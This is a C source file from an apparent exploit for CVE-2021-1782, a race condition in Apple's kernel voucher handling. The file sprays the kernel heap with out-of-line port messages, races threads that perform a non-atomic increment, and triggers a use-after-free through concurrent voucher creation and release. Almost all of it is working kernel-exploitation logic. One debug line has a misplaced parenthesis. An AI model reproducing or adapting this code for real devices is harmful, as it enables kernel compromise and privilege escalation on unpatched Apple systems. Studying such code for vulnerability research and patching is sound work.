#include <mach/mach.h>
#include <pthread.h>
#include <netinet/in.h>
#include <netinet/ip6.h>

#include "cve_2021_1782.h"
#include "helper.h"
#include "spray.h"
#include "voucher.h"

#define WAIT 0
#define START 1
#define DONE 2

mach_port_t target_port;
mach_port_t *spray_ports, *before_ports, *after_ports;
volatile int sync_threads;
volatile mach_port_t voucher;
mach_voucher_attr_recipe_t store_recipe, multiple_redeem_recipe;

void * create_thread(void *arg) {
    mach_voucher_attr_recipe_t store_recipe;

    store_recipe = *(mach_voucher_attr_recipe_t *)arg;

    while (sync_threads == WAIT) {}
    voucher = create_voucher(CONTENT_SIZE, store_recipe);

    return NULL;
}

void * release_thread(void *arg) {
    mach_port_t voucher_port;

    voucher_port = *(mach_port_t *)arg;

    while (sync_threads == WAIT) {}
    release_voucher(voucher_port);

    return NULL;
}

void * inc_emade_thread(void *arg) {

    while (sync_threads == WAIT) {}
    multiple_redeem_voucher(multiple_redeem_recipe, MAX_MULTIPLE_REDEEM_RECIPES);

    return NULL;
}

void init_attempt(int id) {
    store_recipe = create_voucher_recipe(CONTENT_SIZE, id);
}

void clear_attempt() {    
    mach_port_destroy(mach_task_self(), voucher);    
    ool_ports_descriptor_receive_many(before_ports, N_BEFORE_PORTS, OOL_MESSAGES);
    ool_ports_descriptor_receive_many(after_ports, N_AFTER_PORTS, OOL_MESSAGES);
    free(store_recipe);
    free(multiple_redeem_recipe);
}

void init_exploit() {
    prepare_ports(&before_ports, &after_ports, &target_port);
    spray_ports = prepare_spray_ports(target_port);
}

mach_port_t prepare_heap() {
    ool_ports_descriptor_spray_many(before_ports, N_BEFORE_PORTS, OOL_MESSAGES, spray_ports, OOL_PORTS);
    voucher = create_voucher(CONTENT_SIZE, store_recipe);
    ool_ports_descriptor_spray_many(after_ports, N_AFTER_PORTS, OOL_MESSAGES, spray_ports, OOL_PORTS);

    return voucher;
}

void raise_ivace_made(struct ip6_rthdr *hdr) {
    int i;
    uint64_t target_made, tmp_made;
    uint64_t max_multiple_reedem_recipes;
    uint64_t number_max_iterations, number_rest_recipes;
    mach_voucher_attr_recipe_t rest_recipe;

    target_made = (uint64_t)(*(uint32_t *)hdr);
    max_multiple_reedem_recipes = MAX_MULTIPLE_REDEEM_RECIPES;
    number_max_iterations = target_made / max_multiple_reedem_recipes;

    DEBUG_LOG("max_multiple_redeem_recipes: %lld", max_multiple_reedem_recipes);
    DEBUG_LOG("target_made: %llx", target_made);

    tmp_made = 1 + number_max_iterations * max_multiple_reedem_recipes;
    while (tmp_made > target_made) {
        tmp_made = 1 + (--number_max_iterations) * max_multiple_reedem_recipes;
    }
    number_rest_recipes = target_made - tmp_made;

    DEBUG_LOG("number_max_iterations: %lld", number_max_iterations;)
    DEBUG_LOG("number_rest_recipes: %lld", number_rest_recipes);
    DEBUG_LOG("=> raised ivace->made: %llx", (tmp_made + number_rest_recipes));

    multiple_redeem_recipe = multiple_redeem_voucher_recipe(voucher, MAX_MULTIPLE_REDEEM_RECIPES);
    rest_recipe = multiple_redeem_voucher_recipe(voucher, number_rest_recipes);
    for (i = 0; i < number_max_iterations; i++) {
        multiple_redeem_voucher(multiple_redeem_recipe, MAX_MULTIPLE_REDEEM_RECIPES);
    }
    multiple_redeem_voucher(rest_recipe, number_rest_recipes);
}

mach_port_t trigger_uaf(int id) {
    int i;
    pthread_t create, release;
    pthread_t inc_emade[EMADE_RACE_THREAD];

    mach_port_t voucher_to_release;

    voucher = prepare_heap();
    multiple_redeem_recipe = multiple_redeem_voucher_recipe(voucher, MAX_MULTIPLE_REDEEM_RECIPES);

    sync_threads = WAIT;
    // race e_made++ (non-atomic increment)
    for (i = 0; i < EMADE_RACE_THREAD; i++) {
        pthread_create(&inc_emade[i], NULL, inc_emade_thread, NULL);
    }

    sync_threads = START;
    for (i = 0; i < EMADE_RACE_THREAD; i++) {
        pthread_join(inc_emade[i], NULL);
    }
     
    sync_threads = WAIT;
    pthread_create(&create, NULL, create_thread, (void *)&store_recipe);
    voucher_to_release = voucher;
    pthread_create(&release, NULL, release_thread, (void *)&voucher_to_release);
  
    sync_threads = START;
    pthread_join(create, NULL);
    pthread_join(release, NULL);

    return voucher;
}